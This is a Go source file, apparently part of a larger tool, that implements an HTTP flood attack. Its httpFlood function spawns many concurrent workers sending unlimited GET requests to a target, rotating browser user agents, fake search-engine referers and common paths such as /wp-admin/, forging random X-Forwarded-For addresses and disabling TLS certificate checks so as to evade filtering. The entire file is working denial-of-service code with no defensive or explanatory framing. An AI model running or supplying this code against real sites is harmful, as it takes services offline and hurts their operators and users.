package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
}

var referers = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://search.yahoo.com/",
	"https://www.facebook.com/",
	"https://twitter.com/",
	"https://www.reddit.com/",
	"https://t.co/",
	"https://www.instagram.com/",
}

var paths = []string{
	"/", "/index.html", "/wp-admin/", "/login", "/api/", "/search", "/about",
	"/contact", "/products", "/blog", "/category/", "/tag/", "/page/",
	"/?s=", "/?p=1", "/?page_id=", "/?ref=", "/?utm_source=",
}

func randomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func randomReferer() string {
	return referers[rand.Intn(len(referers))]
}

func randomPath() string {
	return paths[rand.Intn(len(paths))]
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func httpFlood(ctx context.Context, rawTarget string, concurrents, rpc int, useTLS bool) {
	if !strings.HasPrefix(rawTarget, "http://") && !strings.HasPrefix(rawTarget, "https://") {
		if useTLS {
			rawTarget = "https://" + rawTarget
		} else {
			rawTarget = "http://" + rawTarget
		}
	}

	u, err := url.Parse(rawTarget)
	if err != nil {
		logf("HTTP parse failed: %v", err)
		return
	}

	transport := &http.Transport{
		MaxIdleConnsPerHost: 1024,
		MaxConnsPerHost:     1024,
		DisableKeepAlives:   false,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS10,
		},
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	var wg sync.WaitGroup

	for i := 0; i < concurrents; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			limit := rpc
			if limit <= 0 {
				limit = -1
			}

			for sent := 0; limit == -1 || sent < limit; sent++ {
				select {
				case <-ctx.Done():
					return
				default:
				}

				reqURL := u.Scheme + "://" + u.Host + randomPath()
				if u.RawQuery != "" {
					reqURL += "&" + u.RawQuery
				}

				req, err := http.NewRequest("GET", reqURL, nil)
				if err != nil {
					continue
				}

				req.Header.Set("User-Agent", randomUA())
				req.Header.Set("Referer", randomReferer())
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
				req.Header.Set("Accept-Language", "en-US,en;q=0.5")
				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("X-Forwarded-For", randomIP())
				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")

				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}
		}(i)
	}

	wg.Wait()
	transport.CloseIdleConnections()
}
